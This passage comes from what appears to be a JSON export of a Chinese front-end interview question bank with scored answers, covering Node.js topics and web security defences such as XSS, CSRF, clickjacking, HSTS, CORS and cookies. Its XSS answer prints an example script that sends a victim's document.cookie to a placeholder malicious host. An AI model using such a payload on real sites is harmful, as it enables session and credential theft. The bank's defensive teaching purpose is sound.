Frontend）是中间层，由前端同学开发的后端项目。","escaped":false}]}]},{"type":"list_item","raw":"- 最常见的BFF项目像SSR和GraphQL。SSR用来解决SEO问题，GraphQL用来聚合数据，解决API查询的问题。","task":false,"loose":true,"text":"最常见的BFF项目像SSR和GraphQL。SSR用来解决SEO问题，GraphQL用来聚合数据，解决API查询的问题。","tokens":[{"type":"text","raw":"最常见的BFF项目像SSR和GraphQL。SSR用来解决SEO问题，GraphQL用来聚合数据，解决API查询的问题。","text":"最常见的BFF项目像SSR和GraphQL。SSR用来解决SEO问题，GraphQL用来聚合数据，解决API查询的问题。","tokens":[{"type":"text","raw":"最常见的BFF项目像SSR和GraphQL。SSR用来解决SEO问题，GraphQL用来聚合数据，解决API查询的问题。","text":"最常见的BFF项目像SSR和GraphQL。SSR用来解决SEO问题，GraphQL用来聚合数据，解决API查询的问题。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 11. 什么是ORM？Nodejs的ORM框架有哪些？\\n\\n","depth":2,"text":"11. 什么是ORM？Nodejs的ORM框架有哪些？","tokens":[{"type":"text","raw":"11. 什么是ORM？Nodejs的ORM框架有哪些？","text":"11. 什么是ORM？Nodejs的ORM框架有哪些？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"list","raw":"- ORM框架是通过对SQL语句进行封装，并将数据库的数据表和用户代码里的模型对象进行自动映射。\\n\\n- 这样开发者使用时只需要调用模型对象的方法就能实现对数据库的增删改查，不用手写太多的SQL了。\\n\\n- Nodejs的ORM框架有Sequelize、TypeORM、Mongoose等。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- ORM框架是通过对SQL语句进行封装，并将数据库的数据表和用户代码里的模型对象进行自动映射。\\n\\n","task":false,"loose":true,"text":"ORM框架是通过对SQL语句进行封装，并将数据库的数据表和用户代码里的模型对象进行自动映射。\\n","tokens":[{"type":"text","raw":"ORM框架是通过对SQL语句进行封装，并将数据库的数据表和用户代码里的模型对象进行自动映射。\\n","text":"ORM框架是通过对SQL语句进行封装，并将数据库的数据表和用户代码里的模型对象进行自动映射。","tokens":[{"type":"text","raw":"ORM框架是通过对SQL语句进行封装，并将数据库的数据表和用户代码里的模型对象进行自动映射。","text":"ORM框架是通过对SQL语句进行封装，并将数据库的数据表和用户代码里的模型对象进行自动映射。","escaped":false}]}]},{"type":"list_item","raw":"- 这样开发者使用时只需要调用模型对象的方法就能实现对数据库的增删改查，不用手写太多的SQL了。\\n\\n","task":false,"loose":true,"text":"这样开发者使用时只需要调用模型对象的方法就能实现对数据库的增删改查，不用手写太多的SQL了。\\n","tokens":[{"type":"text","raw":"这样开发者使用时只需要调用模型对象的方法就能实现对数据库的增删改查，不用手写太多的SQL了。\\n","text":"这样开发者使用时只需要调用模型对象的方法就能实现对数据库的增删改查，不用手写太多的SQL了。","tokens":[{"type":"text","raw":"这样开发者使用时只需要调用模型对象的方法就能实现对数据库的增删改查，不用手写太多的SQL了。","text":"这样开发者使用时只需要调用模型对象的方法就能实现对数据库的增删改查，不用手写太多的SQL了。","escaped":false}]}]},{"type":"list_item","raw":"- Nodejs的ORM框架有Sequelize、TypeORM、Mongoose等。","task":false,"loose":true,"text":"Nodejs的ORM框架有Sequelize、TypeORM、Mongoose等。","tokens":[{"type":"text","raw":"Nodejs的ORM框架有Sequelize、TypeORM、Mongoose等。","text":"Nodejs的ORM框架有Sequelize、TypeORM、Mongoose等。","tokens":[{"type":"text","raw":"Nodejs的ORM框架有Sequelize、TypeORM、Mongoose等。","text":"Nodejs的ORM框架有Sequelize、TypeORM、Mongoose等。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 12. 什么是微服务？\\n\\n","depth":2,"text":"12. 什么是微服务？","tokens":[{"type":"text","raw":"12. 什么是微服务？","text":"12. 什么是微服务？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1 分）\\n\\n","depth":4,"text":"解答（1 分）","tokens":[{"type":"text","raw":"解答（1 分）","text":"解答（1 分）","escaped":false}]},{"type":"list","raw":"- 微服务是一种架构风格，将一个大型应用拆分成多个小型、独立、可部署的服务，每个服务都运行在自己的进程中，并使用轻量级的通信机制（如HTTP、消息队列等）进行通信。\\n\\n- 微服务架构的优点是每个服务都可以独立开发、部署和扩展，提高了开发效率和系统的可维护性。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- 微服务是一种架构风格，将一个大型应用拆分成多个小型、独立、可部署的服务，每个服务都运行在自己的进程中，并使用轻量级的通信机制（如HTTP、消息队列等）进行通信。\\n\\n","task":false,"loose":true,"text":"微服务是一种架构风格，将一个大型应用拆分成多个小型、独立、可部署的服务，每个服务都运行在自己的进程中，并使用轻量级的通信机制（如HTTP、消息队列等）进行通信。\\n","tokens":[{"type":"text","raw":"微服务是一种架构风格，将一个大型应用拆分成多个小型、独立、可部署的服务，每个服务都运行在自己的进程中，并使用轻量级的通信机制（如HTTP、消息队列等）进行通信。\\n","text":"微服务是一种架构风格，将一个大型应用拆分成多个小型、独立、可部署的服务，每个服务都运行在自己的进程中，并使用轻量级的通信机制（如HTTP、消息队列等）进行通信。","tokens":[{"type":"text","raw":"微服务是一种架构风格，将一个大型应用拆分成多个小型、独立、可部署的服务，每个服务都运行在自己的进程中，并使用轻量级的通信机制（如HTTP、消息队列等）进行通信。","text":"微服务是一种架构风格，将一个大型应用拆分成多个小型、独立、可部署的服务，每个服务都运行在自己的进程中，并使用轻量级的通信机制（如HTTP、消息队列等）进行通信。","escaped":false}]}]},{"type":"list_item","raw":"- 微服务架构的优点是每个服务都可以独立开发、部署和扩展，提高了开发效率和系统的可维护性。","task":false,"loose":true,"text":"微服务架构的优点是每个服务都可以独立开发、部署和扩展，提高了开发效率和系统的可维护性。","tokens":[{"type":"text","raw":"微服务架构的优点是每个服务都可以独立开发、部署和扩展，提高了开发效率和系统的可维护性。","text":"微服务架构的优点是每个服务都可以独立开发、部署和扩展，提高了开发效率和系统的可维护性。","tokens":[{"type":"text","raw":"微服务架构的优点是每个服务都可以独立开发、部署和扩展，提高了开发效率和系统的可维护性。","text":"微服务架构的优点是每个服务都可以独立开发、部署和扩展，提高了开发效率和系统的可维护性。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 13. 请介绍一下require的模块加载机制？\\n\\n","depth":2,"text":"13. 请介绍一下require的模块加载机制？","tokens":[{"type":"text","raw":"13. 请介绍一下require的模块加载机制？","text":"13. 请介绍一下require的模块加载机制？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- 先计算模块路径\\n\\n- 如果模块在缓存里面，取出缓存\\n\\n- 如果是内置模块，取出内置模块\\n\\n- 加载模块\\n\\n- 输出模块的exports属性即可\\n","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- 先计算模块路径\\n\\n","task":false,"loose":true,"text":"先计算模块路径\\n","tokens":[{"type":"text","raw":"先计算模块路径\\n","text":"先计算模块路径","tokens":[{"type":"text","raw":"先计算模块路径","text":"先计算模块路径","escaped":false}]}]},{"type":"list_item","raw":"- 如果模块在缓存里面，取出缓存\\n\\n","task":false,"loose":true,"text":"如果模块在缓存里面，取出缓存\\n","tokens":[{"type":"text","raw":"如果模块在缓存里面，取出缓存\\n","text":"如果模块在缓存里面，取出缓存","tokens":[{"type":"text","raw":"如果模块在缓存里面，取出缓存","text":"如果模块在缓存里面，取出缓存","escaped":false}]}]},{"type":"list_item","raw":"- 如果是内置模块，取出内置模块\\n\\n","task":false,"loose":true,"text":"如果是内置模块，取出内置模块\\n","tokens":[{"type":"text","raw":"如果是内置模块，取出内置模块\\n","text":"如果是内置模块，取出内置模块","tokens":[{"type":"text","raw":"如果是内置模块，取出内置模块","text":"如果是内置模块，取出内置模块","escaped":false}]}]},{"type":"list_item","raw":"- 加载模块\\n\\n","task":false,"loose":true,"text":"加载模块\\n","tokens":[{"type":"text","raw":"加载模块\\n","text":"加载模块","tokens":[{"type":"text","raw":"加载模块","text":"加载模块","escaped":false}]}]},{"type":"list_item","raw":"- 输出模块的exports属性即可","task":false,"loose":true,"text":"输出模块的exports属性即可","tokens":[{"type":"text","raw":"输出模块的exports属性即可","text":"输出模块的exports属性即可","tokens":[{"type":"text","raw":"输出模块的exports属性即可","text":"输出模块的exports属性即可","escaped":false}]}]}]}]},{"key":"前端安全","content":"<h1>前端安全</h1>\\n<h2>XSS 攻击</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<ul>\\n<li><strong>:1</strong> XSS（Cross Site Scripting，跨站脚本），即攻击者往 Web 页面里嵌入恶意的客户端脚本，当用户浏览此网页时，脚本就会在用户的浏览器上执行，进而达到攻击者的目的。【获取用户的 Cookie、导航到恶意网站、携带木马】</li>\\n<li><strong>:2</strong> 防御：</li>\\n</ul>\\n<blockquote>\\n<p>1、对输入和 URL 参数进行过滤，过滤掉会导致脚本执行的相关内容。<br>2、对动态输出到页面的内容进行 html 编码，使脚本无法在浏览器中执行。</p>\\n</blockquote>\\n<h2>CSRF 攻击</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（5 分）</h4>\\n<ul>\\n<li><strong>:1</strong> CSRF（Cross Site Request Forgery，跨站请求伪造），即在别的站点伪造了一个请求，在受害者访问一个网站时，其 cookie 还没有过期的情况下，攻击者伪造一个链接地址发送受害者并欺骗让其点击，从而形成 CSRF 攻击。</li>\\n<li><strong>:4</strong> 防御：</li>\\n</ul>\\n<blockquote>\\n<p>1、验证 HTTP 的 Referer 字段。<br>2、在请求地址中添加 token 并验证。<br>3、在 HTTP 头中自定义属性并验证。<br>4、涉及到数据修改操作严格使用 post 请求而不是 get 请求。  </p>\\n<blockquote>\\n<p>get 的 URL 会被放在浏览器历史和 WEB 服务器日志里面，如果把关键数据放在 get 里面，被人偷窥了浏览器，会造成数据泄露。而 post 日志没有记录，也不会保留 URL，只要数据库服务器不被入侵，基本还是安全的。</p>\\n</blockquote>\\n</blockquote>\\n<h2>iframe 风险</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><strong>:1</strong> 前端页面需要用到第三方提供的页面组件，通常会以 iframe 的方式引入，比如广告插件等。这些第三方提供的插件可以运行 js 脚本、flash 插件等，破坏用户体验。</li>\\n<li><strong>:1</strong> 防御：</li>\\n</ul>\\n<blockquote>\\n<p>iframe 中有一个叫做 sandbox 的安全属性，通过它可以对 iframe 的行为进行各种限制，充分实现“最小权限”原则。  </p>\\n</blockquote>\\n<h2>点击劫持</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（6 分）</h4>\\n<ul>\\n<li><strong>:1</strong> 通过 iframe 使用别人提供的内容时，自己的页面也可能正在被不法分子放到他们精心构造的 iframe 中，进行点击劫持攻击。这是一种欺骗性强、用户参与高的攻击。</li>\\n<li><strong>:2</strong> 通常的攻击步骤是这样的：</li>\\n</ul>\\n<blockquote>\\n<p>1、攻击者构造一个诱导用户点击的内容，比如页面小游戏。<br>2、将我们的页面放入到 iframe 当中。<br>3、利用 z-index 等 CSS 样式将这个 iframe 叠加到小游戏的垂直方向的正上方。<br>4、把 iframe 设置为100%透明度。<br>5、受害者访问到这个页面后，肉眼看到的是一个小游戏，如果受到诱导进行了点击的话，实际上点击到的却是 iframe 中的我们自己的页面。</p>\\n</blockquote>\\n<ul>\\n<li><strong>:1</strong> 危害：</li>\\n</ul>\\n<blockquote>\\n<p>攻击者利用了受害者的用户身份，在其不知情的情况下进行一些操作。如果是删除某个重要文件记录，或者窃取敏感信息，那么造成的危害就难以承受。</p>\\n</blockquote>\\n<ul>\\n<li><strong>:2</strong> 防御：</li>\\n</ul>\\n<blockquote>\\n<p>1、使用 X-Frame-Options：DENY 这个 HTTP Header 来明确的告知浏览器，不要把当前HTTP响应中的内容在HTML Frame 中显示出来。\\n2、判断当前页面是否被嵌入到 iframe 中。</p>\\n</blockquote>\\n<h2>第三方依赖包带来的问题</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><p><strong>:1</strong> 现在绝大多数的开发都是在借助开发框架和各种类库进行快速开发。这样做虽然方便快速，但是与此同时也存在安全风险，如果这些来自第三方的代码有安全漏洞，那么对应用整体的安全性依然会造成严峻的挑战。\\n比如 Node.js 有一些已知的安全漏洞，比如 CVE-2017-11499，可能导致前端应用受到 DoS 攻击。</p>\\n</li>\\n<li><p><strong>:1</strong> 防御：</p>\\n</li>\\n</ul>\\n<blockquote>\\n<p>使用 NSP(Node Security Platform)、Snyk 等等这类工具。</p>\\n</blockquote>\\n<h2>https 存在的风险</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（4 分）</h4>\\n<ul>\\n<li><strong>:1</strong> 即使是服务器端开启了 https，也还是存在安全隐患，黑客可以利用 SSL Stripping 这种攻击手段，强制让 https 降级回 http，从而继续进行中间人攻击。</li>\\n<li><strong>:2</strong> 过程:</li>\\n</ul>\\n<blockquote>\\n<p>1、用户在浏览器里输入 URL 的时候往往不是从 https:// 开始的，而是直接从域名开始输入；<br>2、随后浏览器向服务器发起 http 通信;<br>3、攻击者把服务器端返回的跳转到 https 页面的响应拦截了，并且代替客户端和服务器端进行后续的通信。  </p>\\n</blockquote>\\n<ul>\\n<li><strong>:1</strong> 防御：</li>\\n</ul>\\n<blockquote>\\n<p>使用 HSTS（HTTP Strict Transport Security），通过 HTTP Header 以及一个预加载的清单，来告知浏览器在和网站进行通信的时候强制性使用 HTTPS，而不是通过明文的HTTP进行通信。\\n 并且当遇到证书或者链接不安全的时候，则首先警告用户，并且不再让用户继续进行不安全的通信。</p>\\n</blockquote>\\n<h2>什么是跨站脚本攻击（XSS）？如何防范？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（9 分）</h4>\\n<details>\\n\\n<ul>\\n<li><p><strong>2：</strong> 跨站脚本攻击（XSS）是一种常见的网络安全漏洞。它允许攻击者将恶意脚本（通常是 JavaScript，但也可以是其他客户端脚本语言，如 VBScript）注\\n入到目标网站中。这些恶意脚本在用户的浏览器中执行，因为浏览器会把它当作正常的脚本代码来解析。例如：\\n一个存在 XSS 漏洞的网站有一个评论功能。攻击者在评论框中输入一段包含恶意 JavaScript 代码的评论，如\\n<code>&lt;script&gt;document.location = &#39;http://malicious - site.com?cookie=&#39; + document.cookie&lt;/script&gt;</code>。当其他用户访问包含这条评论\\n的页面时，他们的浏览器会执行这段脚本。这段脚本会获取用户的浏览器 cookie 信息（其中可能包含用户的登录凭证等敏感信息），并将其发送到攻击者指定的恶意\\n网站<code>（http://malicious - site.com）</code>。</p>\\n</li>\\n<li><p><strong>1：</strong> 输入验证和过滤：<br/>\\n&emsp;对用户输入进行严格验证：在接收用户输入的地方（如表单提交、URL 参数等），要验证输入的内容是否符合预期的格式。例如，如果是一个只允许输入数字的字段，要检查输入是否真的是数字。\\n&emsp;过滤特殊字符：对于可能包含脚本代码的字符进行过滤。例如，对&lt;、&gt;、&amp;、&quot;、&#39;等 HTML 特殊字符进行转义。在 JavaScript 中，可以使用encodeURIComponent()函数对用户输入的 URL\\n 参数进行编码，在服务器端也可以使用相应的函数来处理。例如在 PHP 中，使用htmlspecialchars()函数来转义 HTML 中的特殊字符，这样可以防止用户输入的内容被当作 HTML 标签或脚本解析。</p>\\n</li>\\n<li><p><strong>2：</strong> 输出编码：<br/>\\n&emsp;根据输出上下文进行编码：当把用户输入的数据输出到 HTML 页面时，要根据输出的位置进行合适的编码。如果是输出到 HTML 标签内部的文本内容，应该使\\n用 HTML 实体编码。例如，<code>将&lt;转义为&amp;lt;，&gt;转义为&amp;gt;</code>。如果是输出到 JavaScript 代码中的变量，要使用 JavaScript 编码，如对引号等进行转义，以防止代码注入。</p>\\n</li>\\n<li><p><strong>2：</strong> 内容安全策略（CSP）：<br/>\\n&emsp;设置策略限制脚本来源：CSP 是一种浏览器安全机制，它允许网站所有者定义哪些来源的脚本可以在页面上执行。例如，可以在服务器的响应头中设\\n置<code>Content-Security-Policy: default- src&#39;self&#39;; script-src&#39;self&#39; https://trusted-scripts.com</code>。这意味着默认情况下，只允许来自当前网\\n站（self）的资源加载，而脚本可以来自当前网站和<code>https://trusted - scripts.com</code>。这样可以防止外部恶意脚本的注入。<br/>\\n&emsp;阻止内联脚本和 eval () 函数的滥用：CSP 还可以设置script-src指令为&#39;nonce-value&#39;或&#39;hash-value&#39;来限制内联脚本的执行。内联脚本是直接写在\\nHTML 标签中的脚本，如<code>&lt;script&gt;alert(&#39;XSS&#39;);&lt;/script&gt;</code>，这种形式的脚本容易被攻击者利用。同时，限制eval()函数的使用，因为eval()可以动态地执行字符串形式的 JavaScript 代码，\\n攻击者可能会利用它来执行恶意代码。</p>\\n</li>\\n<li><p><strong>2：</strong> 使用安全的库和框架：利用内置的安全机制，许多现代的前端框架（如 React、Vue.js）都有内置的安全机制来防止 XSS。例如，React 会自动对输出到 DOM 中的内容进行转义，除非你使用dangerouslySetInnerHTML属性（这种情况下开发者需要自己确保内容是安全的）。Vue.js 也有类似的机制，在使用插值表达式<code>（{{}}）</code>时会对内容进行 HTML 转义，防止脚本注入。</p>\\n</li>\\n</ul>\\n</details>\\n\\n<h2>前端如何防止点击劫持？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><strong>2：</strong> 可以使用 X-Frame-Options 响应头来限制页面能否被嵌套在 iframe 中，例如设置为 DENY 禁止任何页面嵌套，或者 SAMEORIGIN 只允许同源页面嵌套。</li>\\n</ul>\\n<h2>在前端如何安全地处理用户密码？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<ul>\\n<li><strong>1：</strong> 不要明文存储：前端绝对不能以明文形式存储用户密码。在密码输入框应使用input type=&quot;password&quot;来隐藏用户输入。</li>\\n<li><strong>1：</strong> 传输加密：在将密码发送到后端时，应确保使用 HTTPS 协议进行加密传输，防止密码在网络传输过程中被窃取。</li>\\n<li><strong>1：</strong> 避免本地缓存：设置表单元素的autocomplete=&quot;off&quot;，防止浏览器缓存密码。</li>\\n</ul>\\n<h2>假设你有一个使用 JavaScript 实现的表单提交功能，如何防止表单数据在提交过程中被篡改？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<ul>\\n<li><strong>1：</strong> 数据加密：在前端对表单数据进行加密处理后再提交，后端接收数据后再进行解密。例如，可以使用如 AES 等加密算法，确保数据在传输过程中的完整性。</li>\\n<li><strong>1：</strong> 添加数字签名：使用非对称加密算法（如 RSA）对表单数据生成数字签名。在后端接收到数据后，验证数字签名的有效性。如果签名验证通过，说明数据\\n在传输过程中没有被篡改。</li>\\n<li><strong>1：</strong> 使用 HTTPS：通过使用 HTTPS 协议提交表单，防止数据在网络传输过程中被中间人篡改。</li>\\n</ul>\\n<h2>什么是同源策略，它如何影响前端安全？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><strong>1：</strong> 同源策略：同源策略是浏览器的一种安全机制，它规定一个源（包括协议、域名、端口）的脚本只能访问同来源的资源。</li>\\n<li><strong>1：</strong> 对前端安全的影响：它防止恶意网站窃取用户在其他网站的敏感数据，保障了用户在浏览网页时的信息安全。</li>\\n</ul>\\n<h2>同源策略相关的安全机制有哪些</h2>\\n<h4>类型：<code>拓展</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（6 分）</h4>\\n<details>\\n\\n<ul>\\n<li><strong>1：</strong> 跨域资源共享（CORS - Cross-Origin Resource Sharing）:<br/>\\n&emsp;原理：CORS 是一种基于 HTTP 头的机制，它允许服务器明确指定哪些源（协议、域名、端口的组合）可以访问其资源。当浏览器发起跨域请求时，会自动在请求中\\n添加一个 Origin 头，表明请求来自哪个源。服务器收到请求后，会根据自身配置的 CORS 规则，通过在响应头中添加相应的字段来决定是否允许该跨域请求。<br/>\\n&emsp;示例：假设前端页面的源是 <code>https://example.com</code>（协议为 https，域名是 example.com），要向 <code>https://api.example.com</code>（另一个同源但不同子域名\\n的服务器）发起获取数据的 AJAX 请求（比如使用 fetch API）。在服务器端<code>（https://api.example.com）</code>如果要允许来自 <code>https://example.com</code> 的跨域请求，可以\\n配置响应头如下</li>\\n</ul>\\n<pre><code class=\\"language-js\\">Access-Control-Allow-Origin: https://example.com\\nAccess-Control-Allow-Methods: GET, POST, OPTIONS\\nAccess-Control-Allow-Headers: Content-Type\\n//这意味着服务器允许 https://example.com 这个源使用 GET、POST 等指定的请求方法，并且允许带有 Content-Type 头的请求，浏览器看到这样的响应头后，就会\\n//知道这个跨域请求是被允许的，进而正常处理返回的数据。\\n</code></pre>\\n<ul>\\n<li><strong>2：</strong> 跨文档消息传递（Cross-Document Messaging）:<br/>\\n&emsp;原理：不同源的文档之间想要安全通信时，可以使用 postMessage 方法。通过这个方法，一个窗口（可以是 iframe 嵌入的页面、新打开的窗口等）可以向另一个不同\\n源的窗口发送消息，接收方通过监听 message 事件来获取并处理收到的消息。在发送消息时，可以指定目标窗口的源（targetOrigin 参数），这样可以确保消息只会发送到期\\n望的源对应的窗口，避免信息泄露给其他不相关的窗口。<br/>\\n&emsp;示例：在页面 <code>https://parent.com</code> 中有一个 iframe 加载了 <code>https://child.com</code> 的页面。在 <code>https://parent.com</code> 页面的脚本中，可以这样\\n向 iframe 中的页面发送消息:</li>\\n</ul>\\n<pre><code class=\\"language-js\\">const iframe = document.getElementById(&#39;myIframe&#39;);\\niframe.contentWindow.postMessage(&#39;这是一条消息&#39;, &#39;https://child.com&#39;);\\n</code></pre>\\n<br/>\\n&emsp;在 `https://child.com` 页面中监听 message 事件来接收处理消息:\\n\\n<pre><code class=\\"language-js\\">window.addEventListener(&#39;message&#39;, function(event) {\\n    if (event.origin === &#39;https://parent.com&#39;) {\\n        console.log(&#39;收到来自父页面的消息：&#39;, event.data);\\n        // 可以在这里根据消息内容进行相应操作\\n    }\\n});\\n</code></pre>\\n<ul>\\n<li><strong>1：</strong> JSONP（虽然存在安全隐患，但曾是一种跨域手段）:<br/>\\n&emsp;原理：JSONP 利用了 <code>&lt;script&gt;</code> 标签不受同源策略限制的特点来实现跨域获取数据。它要求服务器返回的数据包裹在一个函数调用中，前端事先定义好这个函数。当浏\\n览器加载包含该函数调用形式数据的 <code>&lt;script&gt;</code> 标签时，就会执行这个函数从而获取到数据。<br/>\\n&emsp;示例：前端页面需要从 <code>https://api.example.com</code> 获取数据，在页面中可以这样写：</li>\\n</ul>\\n<pre><code class=\\"language-js\\">function handleData(data) {\\n    console.log(&#39;获取到的数据：&#39;, data);\\n}\\n&lt;script src=&quot;https://api.example.com/getData?callback=handleData&quot;&gt;&lt;/script&gt;\\n//服务器端（https://api.example.com）接收到请求后，会将数据按照约定格式返回，例如返回类似 handleData({ &quot;name&quot;: &quot;张三&quot;, &quot;age&quot;: 20 }) 的内容，浏览\\n// 器加载这个 &lt;script&gt; 时就会执行 handleData 函数并传入数据。不过，JSONP 的缺点是它没有对返回的数据做安全验证，容易遭受 XSS 攻击，所以现在正规场景下使用\\n// 较少，多被 CORS 等更安全的机制替代。\\n</code></pre>\\n<ul>\\n<li><strong>2：</strong> 同源策略下的 Cookie 限制:<br/>\\n&emsp;原理：默认情况下，浏览器发送 Cookie 遵循同源策略，只有当请求的目标 URL 与 Cookie 所属的域同源时，浏览器才会自动在请求头中带上对应的 Cookie。但在\\n一些跨域场景中，比如子域名之间共享 Cookie，可以通过设置 Domain 属性来指定允许共享的域名范围（要遵循一定规则，比如不能设置为顶级域名之外的其他域等），还可以通过\\n设置 SameSite 属性来控制 Cookie 在跨站请求时的发送行为，SameSite 有 Strict、Lax、None 等取值，Strict 模式下只有同站点请求才会发送 Cookie，Lax 模式在一\\n些安全的跨站导航请求时会有条件发送 Cookie，None 模式（通常需要配合 Secure 属性在 HTTPS 下使用）相对宽松些允许跨站发送 Cookie 但安全性依赖于 HTTPS 加密。<br/>\\n&emsp;示例：在服务器端设置 Cookie 时（假设使用 Node.js 的 http 模块简单示例）：</li>\\n</ul>\\n<pre><code class=\\"language-js\\">http.createServer((req, res) =&gt; {\\n    res.writeHead(200, {\\n        &#39;Set-Cookie&#39;: &#39;myCookie=value; Domain=.example.com; SameSite=Lax; Path=/&#39;\\n    });\\n    res.end(&#39;Cookie已设置&#39;);\\n}).listen(3000);\\n//这样设置后，在符合 Lax 模式规则的跨子域名请求等场景下，Cookie 有可能会被发送，实现了在同源策略框架下一定程度的跨域相关 Cookie 管理和共享控制。\\n//这些安全机制在遵循同源策略的基础上，通过不同的方式来实现合理的跨域交互或者加强对跨域场景下信息交互的安全管控，保障 Web 应用的整体安全性。\\n</code></pre>\\n</details>","ast":[{"type":"heading","raw":"# 前端安全\\n\\n","depth":1,"text":"前端安全","tokens":[{"type":"text","raw":"前端安全","text":"前端安全","escaped":false}]},{"type":"heading","raw":"## XSS 攻击\\n\\n","depth":2,"text":"XSS 攻击","tokens":[{"type":"text","raw":"XSS 攻击","text":"XSS 攻击","escaped":false}]},{"type":"heading","raw":"#### 